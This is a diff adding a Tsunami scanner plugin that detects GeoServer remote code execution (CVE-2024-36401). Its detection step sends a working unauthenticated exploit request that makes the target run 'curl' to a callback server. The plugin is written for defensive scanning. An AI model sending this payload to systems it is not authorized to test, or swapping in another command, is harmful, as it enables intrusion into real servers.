@@ -1,0 +1,96 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Geoserver_CVE_2024_36401"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "grandsilva for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2024-36401"
+  }
+  title: "Geoserver RCE (CVE-2024-36401)"
+  description: 
+    "This detector checks for Geoserver RCE (CVE-2024-36401). "
+    "Multiple OGC request parameters allow Remote Code Execution (RCE) "
+    "by unauthenticated users through specially crafted input against "
+    "a default GeoServer installation due to unsafely evaluating property "
+    "names as XPath expressions."
+  recommendation:
+    "Upgrade Geoserver to a patched version. The vulnerability was fixed in"
+    " versions 2.23.6, 2.24.4, and 2.25.2."
+  severity: CRITICAL
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-36401"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+# fingerprint step
+# not ideal to only check 200 status code, 
+# but not sure what variants of vulnerable versions there might be
+# and this is what the original plugin does
+
+actions: {
+  name: "fingerprint_geoserver"
+  http_request: {
+    method: GET
+    uri: "/geoserver/index.html"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+# execute payload
+# I would move this into a payload workflow variable,
+# but the tests can't use workflow variables yet.
+
+actions: {
+  name: "execute_payload"
+  http_request: {
+    method: GET
+    uri: 
+      "/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames"
+      "=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),"
+      "'curl {{ T_CBS_URI }}'"
+      ")"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_geoserver",
+    "execute_payload",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
